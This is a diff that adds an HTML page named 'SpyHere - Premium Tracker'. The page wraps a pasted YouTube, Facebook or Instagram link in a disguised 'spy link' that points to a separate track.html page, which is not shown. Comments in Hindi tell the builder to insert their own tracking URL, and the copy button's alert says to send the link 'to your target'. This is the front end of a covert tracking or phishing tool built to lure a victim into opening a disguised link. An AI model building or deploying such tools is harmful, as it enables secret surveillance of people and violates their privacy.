@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpyHere - Premium Tracker</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .logo {
+            font-size: 3rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, #00f2ea, #ff0050);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 242, 234, 0.1);
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            background: #252525;
+            border: 1px solid #333;
+            color: #fff;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus { border-color: #00f2ea; }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #00f2ea, #00a8ff);
+            border: none;
+            color: #000;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: 0.3s;
+        }
+        button:hover { transform: scale(1.02); box-shadow: 0 0 15px #00f2ea; }
+        .result-box {
+            margin-top: 20px;
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            color: #00f2ea;
+            word-break: break-all;
+            display: none;
+        }
+        .copy-btn {
+            background: #333;
+            color: #fff;
+            margin-top: 10px;
+            width: auto;
+            padding: 10px 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo">SpyHere</div>
+    
+    <div class="container">
+        <p style="color: #888; margin-bottom: 20px;">Enter any link to generate a tracker</p>
+        <input type="text" id="targetLink" placeholder="Paste YouTube, FB, or Insta Link here...">
+        <button onclick="generateLink()">Generate Spy Link</button>
+        
+        <div id="result" class="result-box">
+            <span id="generatedLink"></span>
+            <br>
+            <button class="copy-btn" onclick="copyLink()">Copy Link</button>
+        </div>
+    </div>
+
+    <script>
+        function generateLink() {
+            const input = document.getElementById('targetLink').value;
+            if(!input) return alert("Please paste a link first!");
+            
+            // Yahan tum apna actual track.html ka link daalo
+            // Example: https://yourwebsite.com/track.html?target=${encodeURIComponent(input)}
+            // Filhal main ek dummy URL bana raha hun taaki tumhe idea mile
+            const spyLink = window.location.href.split('?')[0] + "track.html?target=" + encodeURIComponent(input);
+            
+            document.getElementById('generatedLink').innerText = spyLink;
+            document.getElementById('result').style.display = 'block';
+        }
+
+        function copyLink() {
+            const link = document.getElementById('generatedLink').innerText;
+            navigator.clipboard.writeText(link);
+            alert("Link Copied! Send it to your target.");
+        }
+    </script>
+</body>
+</html>
